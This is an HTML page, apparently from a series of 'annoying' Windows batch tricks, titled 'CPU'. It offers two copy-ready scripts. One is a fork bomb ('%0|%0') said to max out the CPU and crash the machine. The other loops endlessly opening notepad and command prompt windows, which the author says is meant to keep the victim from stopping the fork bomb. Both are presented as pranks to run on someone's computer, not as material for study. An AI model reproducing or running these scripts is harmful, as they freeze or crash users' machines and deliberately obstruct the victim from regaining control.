<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" integrity="sha384-w1Q4orYjBQndcko6MimVbzY0tgp4pWB4lZ7lr30WKz0vr/aWKhXdBNmNb5D92v7s" crossorigin="anonymous"></script>
    <!-- bootstrap icon -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    <!-- animate -->
    <link href="/style/lib/animate.min.css" rel="stylesheet">
    <!-- my css -->
    <link rel="stylesheet" href="/style/src/index.css">
    <title>CPU || Annoying Batch! || 9</title>
</head>
<body>
    <div class="container-fluid d-flex flex-column flex-wrap justify-content-start align-items-center">
        <div class="container d-flex flex-column align-items-center  justify-content-start my-1">
            <!-- content here -->
                <h1>CPU</h1>
                <div class="border-1 border-dark w-100 border mt-3"></div>
            <p>
                The code below, uses 100% of your CPU. It runs into an error causing your computer to have
                a seizure.
            </p>
<div class="textarea-holder container-fluid d-flex justify-content-center align-items-center flex-column bg-light">
<button class="buttonCopy m-4 btn-success buttons">Copy Code</button>
<textarea spellcheck="false" rows="9">
%0|%0
</textarea>
</div>
<p>
    Also to stop the user from stopping the command, I creatted a file that opens many COMMAND PROMPTS
    in an attempt to stop the user from closing the COMMAND PROMPT that is running the error.
</p>
<div class="textarea-holder container-fluid d-flex justify-content-center align-items-center flex-column bg-light">
<button class="buttonCopy m-4 btn-success buttons">Copy Code</button>
<textarea spellcheck="false" rows="9">
echo :loopname>file.bat
echo start notepad>>file.bat
echo start cmd>>file.bat
echo goto loopname>>file.bat
start file.bat

%0|%0
</textarea>
</div>
                <!-- navigation buttons -->
            <div class="d-flex flex-wrap justify-content-evenly align-items-center">
                <button id="prev" class="text-nowrap p-5 m-5 buttons btn-danger py-1">
                    <i class="bi bi-arrow-left"></i> prev</button>
                <button id="next" class="text-nowrap p-5 m-5 buttons btn-success py-1">next 
                    <i class="bi bi-arrow-right"></i>
                </button>  
            </div>
        </div>
        <!-- side navigation -->
        <div style="left:0;" class="position-fixed vh-100">
            <div class="w-100 h-100 d-flex flex-column flex-nowrap justify-content-start align-items-center">
                <div class="p-1">
                    <button class="border-1 bg-light px-3 p-0" id="in_out">
                        <i class="bi bi-arrow-bar-right"></i>
                        <i class="d-none bi bi-arrow-bar-left"></i>
                    </button>
                </div>
                <div id="side_left" class="d-none overflowy-scroll d-flex flex-column justify-content-start align-items-center">
                </div>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
    <script src="/script/src/all.js"></script>
</body>
</html>
